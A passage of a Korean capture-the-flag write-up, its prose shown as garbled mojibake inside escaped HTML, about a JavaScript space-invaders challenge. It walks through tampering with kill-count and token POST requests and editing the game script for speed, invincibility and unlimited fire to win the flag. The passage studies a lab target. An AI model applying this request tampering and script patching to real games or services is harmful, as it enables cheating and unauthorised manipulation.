&lt;/p&gt;&lt;pre id=&quot;5dd82706-08c1-471d-83db-90881a57055b&quot; class=&quot;code&quot;&gt;&lt;code&gt;POST /check.php HTTP/1.1
Host: d0ngd0nge.xyz:1818
Content-Length: 142
Accept: */*
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://d0ngd0nge.xyz:1818
Referer: http://d0ngd0nge.xyz:1818/
Accept-Encoding: gzip, deflate
Accept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7,ja;q=0.6
Cookie: PHPSESSID=sr6j7mur4mbske04717sbn78k6
Connection: close

kills=15&amp;amp;token=start&lt;/code&gt;&lt;/pre&gt;&lt;p id=&quot;2dcbcf3c-339f-4f7c-92df-a89c105eb352&quot; class=&quot;&quot;&gt;[25ë¼ì¸ íŒ¨í‚· - Request]&lt;/p&gt;&lt;p id=&quot;7aa03962-bab0-4278-9a2c-f8f5876dd054&quot; class=&quot;&quot;&gt;
&lt;/p&gt;&lt;pre id=&quot;2e053974-f314-46ed-881e-35f9b18a3e0e&quot; class=&quot;code&quot;&gt;&lt;code&gt;HTTP/1.1 200 OK
Date: Sun, 30 Aug 2020 01:44:43 GMT
Server: Apache/2.4.38 (Debian)
X-Powered-By: PHP/7.4.9
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 32
Connection: close
Content-Type: text/html; charset=UTF-8

d2e94e4635c240c14e209fab2fa719e7&lt;/code&gt;&lt;/pre&gt;&lt;p id=&quot;d6955314-e414-42a3-9a34-a2adca0d31e9&quot; class=&quot;&quot;&gt;[25ë¼ì¸ íŒ¨í‚· - Response]&lt;/p&gt;&lt;p id=&quot;a92f244c-969a-47aa-aad1-a837071fc921&quot; class=&quot;&quot;&gt;
&lt;/p&gt;&lt;p id=&quot;588f6285-ec79-4f0f-81c3-ff6cb3326679&quot; class=&quot;&quot;&gt;
&lt;/p&gt;&lt;pre id=&quot;7bfc6a7f-737a-48e2-9423-d7eabb5329de&quot; class=&quot;code&quot;&gt;&lt;code&gt;POST /check.php HTTP/1.1
Host: d0ngd0nge.xyz:1818
Content-Length: 169
Accept: */*
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://d0ngd0nge.xyz:1818
Referer: http://d0ngd0nge.xyz:1818/
Accept-Encoding: gzip, deflate
Accept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7,ja;q=0.6
Cookie: PHPSESSID=sr6j7mur4mbske04717sbn78k6
Connection: close

kills=15&amp;amp;token=d2e94e4635c240c14e209fab2fa719e7&lt;/code&gt;&lt;/pre&gt;&lt;p id=&quot;1355a97c-0ac3-4a26-977e-d651f07d917c&quot; class=&quot;&quot;&gt;[26ë¼ì¸ íŒ¨í‚· - Request]&lt;/p&gt;&lt;p id=&quot;014a7df4-a42d-4cb9-b17b-4dd1318675d6&quot; class=&quot;&quot;&gt;
&lt;/p&gt;&lt;pre id=&quot;e06bc969-940a-46ae-b330-e5346988142d&quot; class=&quot;code&quot;&gt;&lt;code&gt;HTTP/1.1 200 OK
Date: Sun, 30 Aug 2020 01:44:45 GMT
Server: Apache/2.4.38 (Debian)
X-Powered-By: PHP/7.4.9
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 32
Connection: close
Content-Type: text/html; charset=UTF-8

7a115a19ee939868ff2222f8fd765606&lt;/code&gt;&lt;/pre&gt;&lt;p id=&quot;09b62f81-e1cd-449c-aa59-3eb2cbbdae43&quot; class=&quot;&quot;&gt;[26ë¼ì¸ íŒ¨í‚· - Rsponse]&lt;/p&gt;&lt;p id=&quot;14434266-48a8-498b-a138-f19b51b3fa03&quot; class=&quot;&quot;&gt;
&lt;/p&gt;&lt;ul id=&quot;6496de01-3f57-4aa2-8780-8877132d95e0&quot; class=&quot;bulleted-list&quot;&gt;&lt;li&gt;26 ë¼ì¸ ~ 28 ë¼ì¸ê¹Œì§€ ê³¼ì •ì´ ê°™ìœ¼ë¯€ë¡œ ìƒëµ&lt;/li&gt;&lt;/ul&gt;&lt;p id=&quot;862930d5-2c9c-4e63-b38e-ddeb4ed6aa6d&quot; class=&quot;&quot;&gt;
&lt;/p&gt;&lt;p id=&quot;f2072882-ba63-406c-82c8-2f561f15b7ab&quot; class=&quot;&quot;&gt;
&lt;/p&gt;&lt;pre id=&quot;5d322c63-284e-4381-b6ba-4a8aec5b9f99&quot; class=&quot;code&quot;&gt;&lt;code&gt;POST /check.php HTTP/1.1
Host: d0ngd0nge.xyz:1818
Content-Length: 11
Accept: */*
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://d0ngd0nge.xyz:1818
Referer: http://d0ngd0nge.xyz:1818/
Accept-Encoding: gzip, deflate
Accept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7,ja;q=0.6
Cookie: PHPSESSID=sr6j7mur4mbske04717sbn78k6
Connection: close

check=start&lt;/code&gt;&lt;/pre&gt;&lt;p id=&quot;23bbd6ea-cdf3-4f36-b7b6-449427b78700&quot; class=&quot;&quot;&gt;[ë§ˆì§€ë§‰ 29ë¼ì¸ - Reqeust]&lt;/p&gt;&lt;p id=&quot;7d02547c-9b5f-4b2b-b3b3-f51d44c7aec6&quot; class=&quot;&quot;&gt;
&lt;/p&gt;&lt;pre id=&quot;c54ae4d4-840c-4061-b8c2-1e6f85534d49&quot; class=&quot;code&quot;&gt;&lt;code&gt;HTTP/1.1 200 OK
Date: Sun, 30 Aug 2020 01:46:52 GMT
Server: Apache/2.4.38 (Debian)
X-Powered-By: PHP/7.4.9
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 0
Connection: close
Content-Type: text/html; charset=UTF-8&lt;/code&gt;&lt;/pre&gt;&lt;p id=&quot;91910242-e9bc-466f-9dcd-2b315e4ce1e1&quot; class=&quot;&quot;&gt;[ë§ˆì§€ë§‰ 29ë¼ì¸ - Response]&lt;/p&gt;&lt;p id=&quot;95bda5d0-3b4d-44d2-8b9b-9421618bfa96&quot; class=&quot;&quot;&gt;
&lt;/p&gt;&lt;ul id=&quot;38046142-ce8d-4125-8192-255844666576&quot; class=&quot;bulleted-list&quot;&gt;&lt;li&gt;ìœ„ì™€ ê°™ì´ ê·œì¹™ì„±ì„ ì°¾ì•„ë³¸ë‹¤ë©´, ì²˜ìŒ ê²Œì„ í”Œë ˆì´í•˜ì—¬ 15Killì„ í•˜ì˜€ì„ ë•Œ &amp;quot;&lt;strong&gt;kills=15&amp;amp;token=start&lt;/strong&gt;&amp;quot; POST ê°’ì— Tokenì„ ìƒëµí•˜ì—¬ ë³´ë‚´ì§€ë§Œ, ì‘ë‹µìœ¼ë¡œ &amp;quot;&lt;strong&gt;d2e94e4635c240c14e209fab2fa719e7&lt;/strong&gt;&amp;quot; í† í°ì„ ê°€ì ¸ì˜¤ê²Œ ë©ë‹ˆë‹¤. ë‘ ë²ˆì§¸ 15Kill ë¶€í„° ë°›ì•˜ë˜ í† í°ì„ ë‹¤ì‹œ ì „ì†¡í•˜ëŠ” ê·œì¹™ì„ ì°¾ì„ ìˆ˜ ìˆë‹¤.&lt;/li&gt;&lt;/ul&gt;&lt;ul id=&quot;96badbd8-e49b-412e-b61d-769e8f467906&quot; class=&quot;bulleted-list&quot;&gt;&lt;li&gt;ë§ˆì§€ë§‰ìœ¼ë¡œ ê²Œì„ì´ ì¢…ë£Œë˜ì—ˆì„ ë•ŒëŠ” ë³„ë‹¤ë¥¸ íŒ¨í‚·ì„ ì „ì†¡í•˜ì§€ ì•Šì§€ë§Œ ì¬ì‹œì‘(Restart) ë²„íŠ¼ì„ í´ë¦­í•˜ì˜€ì„ ë•Œ &amp;quot;&lt;strong&gt;check=start&lt;/strong&gt;&amp;quot; íŒ¨í‚·ì„ í™•ì¸í•  ìˆ˜ ìˆë‹¤.&lt;/li&gt;&lt;/ul&gt;&lt;p id=&quot;0034fa29-f630-41e1-b786-87011eafee71&quot; class=&quot;&quot;&gt;
&lt;/p&gt;&lt;ul id=&quot;63a672d8-7279-4795-a30a-015fa83b20df&quot; class=&quot;bulleted-list&quot;&gt;&lt;li&gt;í•˜ì§€ë§Œ &amp;quot;í‚¬ìˆ˜&amp;quot; ì¡°ì‘ ë° &amp;quot;í† í°&amp;quot;ê°’ ì¡°ì‘ì´ ë˜ì–´ ìˆìœ¼ë©´ íƒì§€ê°€ ë˜ì–´ ë¬¸ì œë¥¼ í’€ ìˆ˜ ì—†ëŠ” Protectê°€ ì„¤ì •ë˜ì–´ ìˆë‹¤.&lt;/li&gt;&lt;/ul&gt;&lt;p id=&quot;8d080e4e-c92e-4526-9b34-2ca1a2cd0619&quot; class=&quot;&quot;&gt;
&lt;/p&gt;&lt;figure id=&quot;cf1f637c-3110-49b4-bb35-4afa76bfaf5e&quot; class=&quot;image&quot;&gt;&lt;a href=&quot;/assets/bob/bob919.png&quot;&gt;&lt;img style=&quot;width:453px&quot; src=&quot;/assets/bob/bob919.png&quot;/&gt;&lt;/a&gt;&lt;/figure&gt;&lt;p id=&quot;f7ed78ae-28ae-4d7e-9cfb-c04247cddc69&quot; class=&quot;&quot;&gt;
&lt;/p&gt;&lt;pre id=&quot;23e4998c-4fde-495d-b205-f40a23122229&quot; class=&quot;code&quot;&gt;&lt;code&gt;POST /check.php HTTP/1.1
Host: d0ngd0nge.xyz:1818
Content-Length: 142
Accept: */*
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://d0ngd0nge.xyz:1818
Referer: http://d0ngd0nge.xyz:1818/
Accept-Encoding: gzip, deflate
Accept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7,ja;q=0.6
Cookie: PHPSESSID=sr6j7mur4mbske04717sbn78k6
Connection: close

kills=20&lt;/code&gt;&lt;/pre&gt;&lt;p id=&quot;125ac029-d445-4e1b-b38c-2f51c26685dd&quot; class=&quot;&quot;&gt;[kill ìˆ˜ ì¡°ì‘ëœ íŒ¨í‚· - Request]&lt;/p&gt;&lt;p id=&quot;a4235ea8-664c-4da3-9145-621ba1408efb&quot; class=&quot;&quot;&gt;
&lt;/p&gt;&lt;pre id=&quot;fd5c61fa-d05d-444a-b09a-caf903f4c85c&quot; class=&quot;code&quot;&gt;&lt;code&gt;HTTP/1.1 200 OK
Date: Sun, 30 Aug 2020 02:22:26 GMT
Server: Apache/2.4.38 (Debian)
X-Powered-By: PHP/7.4.9
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Vary: Accept-Encoding
Content-Length: 146
Connection: close
Content-Type: text/html; charset=UTF-8

alert(&amp;#x27;ë¹„ì •ìƒ í–‰ìœ„ íƒì§€!! Kills ìˆ˜ê°€ ì¡°ì‘ë˜ì—ˆìŠµë‹ˆë‹¤. ë¶€ì •í–‰ìœ„ë¡œ ì ìˆ˜ë¥¼ ì´ˆê¸°í™” ë˜ì—ˆìŠµë‹ˆë‹¤.&amp;#x27;);location.reload(true);&lt;/code&gt;&lt;/pre&gt;&lt;p id=&quot;819698ce-0135-4814-b2df-94519c1d78f7&quot; class=&quot;&quot;&gt;[Kill ìˆ˜ ì¡°ì‘ëœ íŒ¨í‚· - Response]&lt;/p&gt;&lt;ul id=&quot;a0135ad3-9e67-4f5e-847d-70453268ad0a&quot; class=&quot;bulleted-list&quot;&gt;&lt;li&gt;í•´ë‹¹ í‚¬ ìˆ˜ëŠ” ì¼ì •í•˜ê²Œ 15 Killë¥¼ ì¡°ì‘í•˜ì—¬ ì´ˆê³¼í•  ê²½ìš° ìë™ìœ¼ë¡œ ë¶€ì •í–‰ìœ„ë¡œ ê°„ì£¼ë˜ì–´ ê·¸ë™ì•ˆ ìŒ“ì•„ì˜¨ í‚¬ì„ ì´ˆê¸°í™”ëœë‹¤.&lt;/li&gt;&lt;/ul&gt;&lt;p id=&quot;3a08c13b-4661-40f1-86ba-d2f8274aa612&quot; class=&quot;&quot;&gt;
&lt;/p&gt;&lt;ul id=&quot;f5a17b9f-94af-4b18-88de-122712835869&quot; class=&quot;bulleted-list&quot;&gt;&lt;li&gt;ê·¸ëŸ¬ë©´ ë°˜ëŒ€ë¡œ í† í°ê°’ì´ ì¡°ì‘ë˜ì—ˆì„ ë•Œ ì•„ë˜ì™€ ê°™ì´ í† í° ì¡°ì‘ ê²½ê³ ì°½ì´ ì¶œë ¥ëœë‹¤.&lt;/li&gt;&lt;/ul&gt;&lt;pre id=&quot;cd32bf0c-1a93-4e2e-9c30-3244d749f1e8&quot; class=&quot;code&quot;&gt;&lt;code&gt;POST /check.php HTTP/1.1
Host: d0ngd0nge.xyz:1818
Content-Length: 169
Accept: */*
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://d0ngd0nge.xyz:1818
Referer: http://d0ngd0nge.xyz:1818/
Accept-Encoding: gzip, deflate
Accept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7,ja;q=0.6
Cookie: PHPSESSID=sr6j7mur4mbske04717sbn78k6
Connection: close

kills=15&amp;amp;token=79d7ed5a7bfe66da42d96a7ef433ff4c&lt;/code&gt;&lt;/pre&gt;&lt;p id=&quot;d6b589d6-5af5-4e9c-9319-8f62d6575ceb&quot; class=&quot;&quot;&gt;[Token ì¡°ì‘ íŒ¨í‚· - Request]&lt;/p&gt;&lt;ul id=&quot;5a857a61-723f-4cfd-bcb1-7fe5ad0888ef&quot; class=&quot;bulleted-list&quot;&gt;&lt;li&gt;í† í°ê°’ ì¡°ì‘&lt;/li&gt;&lt;/ul&gt;&lt;p id=&quot;a96e19c5-6476-4e54-8395-0c45cb72c739&quot; class=&quot;&quot;&gt;
&lt;/p&gt;&lt;pre id=&quot;dd8e5437-75b6-44de-a425-9520892af6c7&quot; class=&quot;code&quot;&gt;&lt;code&gt;HTTP/1.1 200 OK
Date: Sun, 30 Aug 2020 02:26:12 GMT
Server: Apache/2.4.38 (Debian)
X-Powered-By: PHP/7.4.9
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Vary: Accept-Encoding
Content-Length: 161
Connection: close
Content-Type: text/html; charset=UTF-8

alert(&amp;#x27;ë¹„ì •ìƒ í–‰ìœ„ íƒì§€!! í† í°ê°’ì´ ì¼ì¹˜í•˜ì§€ ì•ŠìŠµë‹ˆë‹¤. ë¹„ì •ìƒ í–‰ìœ„ë¡œ ì ìˆ˜ê°€ í•©ì³ì§€ì§€ ì•ŠìŠµë‹ˆë‹¤. ìƒˆë¡œê³ ì¹¨ í•´ì£¼ì‹­ì‹œì˜¤&amp;#x27;);&lt;/code&gt;&lt;/pre&gt;&lt;p id=&quot;5643665a-36bc-48bc-a334-478fa4815153&quot; class=&quot;&quot;&gt;[Token ì¡°ì‘ íŒ¨í‚· - Response]&lt;/p&gt;&lt;p id=&quot;747b42e2-5e6f-44f8-a368-eb37bc3dd910&quot; class=&quot;&quot;&gt;ì¡°ì‘ëœ í† í°ê°’ í–‰ìœ„ëŠ” ìœ„ì™€ ê°™ì´ íƒì§€ë˜ì–´ ë”ì´ìƒ Killìˆ˜ê°€ ìŒ“ì´ì§€ ì•ŠëŠ”ë‹¤.&lt;/p&gt;&lt;p id=&quot;7cd3679d-d403-443b-a528-7c935feb4548&quot; class=&quot;&quot;&gt;
&lt;/p&gt;&lt;h3 id=&quot;21a4afef-4293-4755-804c-dde17ff61e99&quot; class=&quot;&quot;&gt;2&lt;strong&gt;. Hint &amp;amp; Debug ì •ë³´ ì°¾ê¸°&lt;/strong&gt;&lt;/h3&gt;&lt;ul id=&quot;ce59e941-2919-4f67-b836-87f3fedf8ad8&quot; class=&quot;bulleted-list&quot;&gt;&lt;li&gt;ì´ì œ ë¡œì§ì— ëŒ€í•´ íŒŒì•…í•˜ì˜€ìœ¼ë‹ˆ, ë¬¸ì œ í’€ì´ë¥¼ ìœ„í•œ íŒíŠ¸ ì •ë³´ë¥¼ ì°¾ì•„ë³´ë„ë¡ í•˜ì.&lt;/li&gt;&lt;/ul&gt;&lt;p id=&quot;b1246ebc-7d7d-48b9-9b81-66532ce080b1&quot; class=&quot;&quot;&gt;
&lt;/p&gt;&lt;figure id=&quot;d441aa11-95e9-4f84-ac4e-3c91f641d3de&quot; class=&quot;image&quot;&gt;&lt;a href=&quot;/assets/bob/bob920.png&quot;&gt;&lt;img style=&quot;width:289px&quot; src=&quot;/assets/bob/bob920.png&quot;/&gt;&lt;/a&gt;&lt;/figure&gt;&lt;p id=&quot;9a6906cd-044d-48d9-99f3-557ad446059f&quot; class=&quot;&quot;&gt;
&lt;/p&gt;&lt;ul id=&quot;8068a341-4d9b-4843-bd18-d3bc04fbc6e4&quot; class=&quot;bulleted-list&quot;&gt;&lt;li&gt;Chrome Consoleì„ í™•ì¸í•´ë³´ë©´ ìœ„ì™€ ê°™ì´ ì†Œìˆ˜ì  ê°’ì„ í™•ì¸í•  ìˆ˜ ìˆë‹¤. (ì¶œë ¥ëœ ê°’ì˜ ê°œìˆ˜ëŠ” ì‚¬ìš©ìë§ˆë‹¤ ë‹¤ë¥¼ ìˆ˜ ìˆìŒ.) í•´ë‹¹ ê°’ì— ëŒ€í•œ ì •ë³´ë¥¼ íŒŒì•…í•˜ê¸° ìœ„í•´ &amp;quot;&lt;strong&gt;bob_game.js&lt;/strong&gt;&amp;quot; íŒŒì¼ì˜ 492ë²ˆì§¸ ì¤„ ì½”ë“œë¥¼ í™•ì¸í•´ë³´ë„ë¡ í•˜ì.&lt;/li&gt;&lt;/ul&gt;&lt;p id=&quot;5cab6650-cb2f-4274-a46f-b205d9e2d778&quot; class=&quot;&quot;&gt;
&lt;/p&gt;&lt;pre id=&quot;9ebeb365-468a-4861-8dbe-20f0929515d6&quot; class=&quot;code&quot;&gt;&lt;code&gt;function initGameStart() {
            screen.canvas.width = 1300;
            screen.canvas.height = 900;
            gameSize = {
              width: 1300,
              height: 900
            };
            
            invaderMultiplier = 3;
            initialOffsetInvader = 420;

          invaderAttackRate = 0.98 + &amp;quot;&amp;quot; + Math.floor(Math.random() * 10);
         &lt;mark class=&quot;highlight-red&quot;&gt; console.log(invaderAttackRate);&lt;/mark&gt;
          invaderSpeed = 30;
          spawnDelayCounter = invaderSpawnDelay;
          
          game = new Game();
        }&lt;/code&gt;&lt;/pre&gt;&lt;ul id=&quot;64726272-d750-4e33-973a-1914836efd4a&quot; class=&quot;bulleted-list&quot;&gt;&lt;li&gt;492ë²ˆì§¸ ì½”ë“œëŠ” &amp;quot;&lt;strong&gt;console.log(invaderAttackRate);&lt;/strong&gt;&amp;quot; ì´ë©° í•´ë‹¹ ê°’ì€ ë³€ìˆ˜ëª…ì—ì„œ ì•Œ ìˆ˜ ìˆë“¯, ê²Œì„ ê³µê²©ì(ì™¸ê³„ì¸)ì˜ ê³µê²© ì†ë„ì´ë©°, í•´ë‹¹ ê°’ì„ ì¡°ì‘í•˜ì—¬ ì–´ë–¤ ë°˜ì‘ì´ ë³´ì´ëŠ”ì§€ í™•ì¸í•´ ë³´ì.&lt;/li&gt;&lt;/ul&gt;&lt;p id=&quot;4e8383dd-195b-4c26-a9dc-5f5fe640169b&quot; class=&quot;&quot;&gt;
&lt;/p&gt;&lt;figure id=&quot;017bfa88-ec5b-4a62-ac14-cc7be9e9f526&quot; class=&quot;image&quot;&gt;&lt;a href=&quot;/assets/bob/Not_Attack.gif&quot;&gt;&lt;img style=&quot;width:1386px&quot; src=&quot;/assets/bob/Not_Attack.gif&quot;/&gt;&lt;/a&gt;&lt;/figure&gt;&lt;p id=&quot;b66b1c79-e1c4-45b6-8f3d-61b074b93f8b&quot; class=&quot;&quot;&gt;
&lt;/p&gt;&lt;ul id=&quot;4d27e2a6-8ff6-4f67-94ae-e96fb56c8721&quot; class=&quot;bulleted-list&quot;&gt;&lt;li&gt;&amp;quot;&lt;strong&gt;invaderAttackRate = 9999;&lt;/strong&gt;&amp;quot; ë°©ì‹ìœ¼ë¡œ ê³µê²©ì(ì™¸ê³„ì¸)ì´ ê³µê²©ì„ í•˜ì§€ ì•ŠëŠ” í–‰ìœ„ë¡œ ë¡œì§ì„ êµ¬í˜„í•  ìˆ˜ ìˆìœ¼ë©° ì•„ë˜ì™€ ê°™ì´ ë°˜ëŒ€ë¡œ ê°’ì„ ë‚®ì¶˜ë‹¤ë©´ ê³µê²©ìëŠ” ë” ë¹ ë¥´ê³  ë§ì´ ê³µê²©ì„ í•˜ê²Œ ëœë‹¤.&lt;/li&gt;&lt;/ul&gt;&lt;p id=&quot;aee65f04-9bb6-4ff8-8e73-e870d45e50e2&quot; class=&quot;&quot;&gt;
&lt;/p&gt;&lt;figure id=&quot;4dede993-ea1e-40ff-8122-1aee239eee4b&quot; class=&quot;image&quot;&gt;&lt;a href=&quot;/assets/bob/Attack.gif&quot;&gt;&lt;img style=&quot;width:1386px&quot; src=&quot;/assets/bob/Attack.gif&quot;/&gt;&lt;/a&gt;&lt;/figure&gt;&lt;ul id=&quot;3a9c46cd-f93a-4821-8f68-42ef8209cb57&quot; class=&quot;bulleted-list&quot;&gt;&lt;li&gt;&amp;quot;&lt;strong&gt;i&lt;/strong&gt;&lt;strong&gt;nvaderAttackRate = 0.001;&amp;quot;&lt;/strong&gt;&lt;strong&gt; ì´ê±´ ë‹µì´ ì—†ë‹¤....&lt;/strong&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p id=&quot;341571b8-804c-489b-92cf-bd9d2eb9b160&quot; class=&quot;&quot;&gt;
&lt;/p&gt;&lt;p id=&quot;57ff79c7-113e-4ee0-8529-e0ed2511cf5a&quot; class=&quot;&quot;&gt;ìœ„ì™€ ê°™ì´ íŒíŠ¸ë¥¼ í†µí•˜ì—¬ Javasciprt Debugë¥¼ í†µí•˜ì—¬ ë¡œì§ì„ ë³€ê²½í•  ìˆ˜ ìˆëŠ” ê±¸ í™•ì¸í•  ìˆ˜ ìˆë‹¤. í•˜ì§€ë§Œ ê³µê²© ì†ë„ë¡œ ë³€ê²½í•˜ëŠ” ê²ƒ ë³´ë‹¨ &amp;quot;&lt;strong&gt;ìŠ¤í”¼ë“œ&lt;/strong&gt;&amp;quot; + &amp;quot;&lt;strong&gt;ë¬´ì &lt;/strong&gt;&amp;quot; + &amp;quot;&lt;strong&gt;ê³µê²©ìˆ˜ ë¬´í•œ&lt;/strong&gt;&amp;quot;ë¥¼ ê±¸ì–´ ë¬¸ì œ í’€ê±°ë‚˜ ìë°”ìŠ¤í¬ë¦½íŠ¸ ë¡œì§ì„ í†µí•˜ì—¬ ê²Œì„ì„ ì§„í–‰í•˜ì§€ ì•Šê³  í’€ì´ë¥¼ ì§„í–‰í•  ìˆ˜ ìˆë‹¤.&lt;/p&gt;&lt;p id=&quot;5138bc33-49f7-431a-901b-9764964b9773&quot; class=&quot;&quot;&gt;
&lt;/p&gt;&lt;p id=&quot;6a152b2e-a6b6-4f16-88c6-fc16995e8fe1&quot; class=&quot;&quot;&gt;
&lt;/p&gt;&lt;h3 id=&quot;818f3b87-dad9-4fd1-9946-887aa33f2afc&quot; class=&quot;&quot;&gt;3&lt;strong&gt;. ìŠ¤í”¼ë“œ + ë¬´ì  + ê³µê²© ì†ë„ í•µ ë§Œë“¤ê¸°&lt;/strong&gt;&lt;/h3&gt;&lt;ul id=&quot;d97df995-ecf4-405f-aec4-046a11a62551&quot; class=&quot;bulleted-list&quot;&gt;&lt;li&gt;ì´ì œ ë¡œì§ì— ëŒ€í•´ íŒŒì•…í•˜ì˜€ìœ¼ë‹ˆ, ë¬¸ì œ í’€ì´ë¥¼ ìœ„í•œ íŒíŠ¸ ì •ë³´ë¥¼ ì°¾ì•„ë³´ë„ë¡ í•˜ì.&lt;/li&gt;&lt;/ul&gt;&lt;p id=&quot;d6cb1219-7317-4fe9-a149-96e0797c6793&quot; class=&quot;&quot;&gt;
&lt;/p&gt;&lt;pre id=&quot;14012ded-9971-4a6d-bc42-97c97eff7fa3&quot; class=&quot;code&quot;&gt;&lt;code&gt;var Player = function() {
          this.active = true;
          this.size = {
            width: 0.1,  //232ë²ˆì§¸ 16 -&amp;gt; 0.1 ìœ¼ë¡œ ìˆ˜ì • (ê²Œì„ í”Œë ˆì´ì–´ ì•ˆë³´ì´ê²Œ ì„¤ì •)
            height: 0.1  //233ë²ˆì§¸ 8  -&amp;gt; 0.1 ìœ¼ë¡œ ìˆ˜ì • (ê²Œì„ í”Œë ˆì´ì–´ ì•ˆë³´ì´ê²Œ ì„¤ì •)
          };

// 259ë²ˆì§¸ ë¼ì¸
if (this.keyboarder.isDown(this.keyboarder.KEYS.LEFT) &amp;amp;&amp;amp; this.coordinates.x &amp;gt; 0) this.coordinates.x -= 30; // 2 -&amp;gt; 30ìœ¼ë¡œ ìˆ˜ì • (ìŠ¤í”¼ë“œ í•µ)

// 260ë²ˆì§¸ ë¼ì¸
else if (this.keyboarder.isDown(this.keyboarder.KEYS.RIGHT) &amp;amp;&amp;amp; this.coordinates.x &amp;lt; gameSize.width - this.size.width) this.coordinates.x += 30; // 2 -&amp;gt; 30ìœ¼ë¡œ ìˆ˜ì • (ìŠ¤í”¼ë“œ í•µ)


if (this.keyboarder.isDown(this.keyboarder.KEYS.Space)) {
            // 263ë²ˆì§¸  this.shooterHeat += 1; ì£¼ì„ ì²˜ë¦¬ (í”Œë ˆì´ì–´ ê³µê²© ì†ë„ ë¬´ì œí•œ)

destroy: function() {
            //291ë²ˆì§¸ this.active = false;  ì£¼ì„ ì²˜ë¦¬ (í”Œë ˆì´ì–´ ë¬´ì )
            //292ë²ˆì§¸ game.lost = true;     ì£¼ì„ ì²˜ë¦¬ (í”Œë ˆì´ì–´ ë¬´ì  - ê²Œì„ ì¢…ë£Œ ì•ˆë˜ê²Œ)
          }


var Projectile = function(coordinates, velocity) {
          this.active = true;
          this.coordinates = coordinates;
          this.size = {
            width: 300, //303ë²ˆì§¸ ì¤„  3 -&amp;gt; 300ìœ¼ë¡œ ë³€ê²½ ìˆ˜ì • (í”Œë ˆì´ì–´ ê³µê²© í¬ê¸° ë³€ê²½)
            height: 3
          };
          this.velocity = velocity;
        };

//491ë²ˆì§¸ invaderAttackRate = 0.98 + &amp;quot;&amp;quot; + Math.floor(Math.random() * 10); ì£¼ì„ ì²˜ë¦¬ (ê³µê²©ì ì™¸ê³„ì¸ì´ ê³µê²© ëª»í•˜ë„ë¡ ìˆ˜ì •)
&lt;/code&gt;&lt;/pre&gt;&lt;ul id=&quot;975e7c52-a448-4d3c-93e3-d7a45d001a4c&quot; class=&quot;bulleted-list&quot;&gt;&lt;li&gt;ìœ„ì™€ ê°™ì´ Javascriptë¥¼ ë³€ê²½í•˜ì—¬ í”Œë ˆì´ë¥¼ í•  ê²½ìš° ì•„ë˜ì™€ ê°™ì´ ì‹¤í–‰ëœë‹¤.&lt;/li&gt;&lt;/ul&gt;&lt;p id=&quot;64c1cc95-2acf-483a-8a80-e52326b0e571&quot; class=&quot;&quot;&gt;
&lt;/p&gt;&lt;figure id=&quot;86250cd1-430c-4f87-8c4a-ddd4224b34d6&quot;&gt;&lt;div class=&quot;source&quot;&gt;&lt;a&gt;&lt;/a&gt;&lt;/div&gt;&lt;/figure&gt;&lt;ul id=&quot;e199adf8-cd99-45f2-a1ba-86c90b9b9159&quot; class=&quot;bulleted-list&quot;&gt;&lt;li&gt;ê²Œì„í•µ ì™„ì„±í•˜ì—¬ í”Œë˜ê·¸ íšë“!&lt;/li&gt;&lt;/ul&gt;&lt;ul id=&quot;5d3ad86b-c860-49e0-8872-b89f19ee8d4b&quot; class=&quot;bulleted-list&quot;&gt;&lt;li&gt;ë¬¼ë¡  ìœ„ ì™€ ê°™ì´ Javascript ê²Œì„ í•µì„ ë§Œë“¤ì–´ í”Œë ˆì´í•˜ì—¬ í”Œë˜ê·¸ë¥¼ íšë“í•  ìˆ˜ ìˆì§€ë§Œ, ê²Œì„ ë¡œì§ì„ íŒŒì•…í•˜ì—¬ Javascriptë¥¼ ì½”ë”©í•  ìˆ˜ ìˆë‹¤ë©´ í”Œë ˆì´ ëŒ€ì‹  ë°˜ë³µë¬¸ìœ¼ë¡œ ì•„ë˜ì™€ ê°™ì´ í”Œë˜ê·¸ë¥¼ íšë“í•  ìˆ˜ ìˆë‹¤.&lt;/li&gt;&lt;/ul&gt;&lt;p id=&quot;cff4eb3b-1dd8-48cf-8e5c-cebaa1671b97&quot; class=&quot;&quot;&gt;
&lt;/p&gt;&lt;p id=&quot;65b1ceba-439e-4468-bbfd-0f55f2f52516&quot; class=&quot;&quot;&gt;
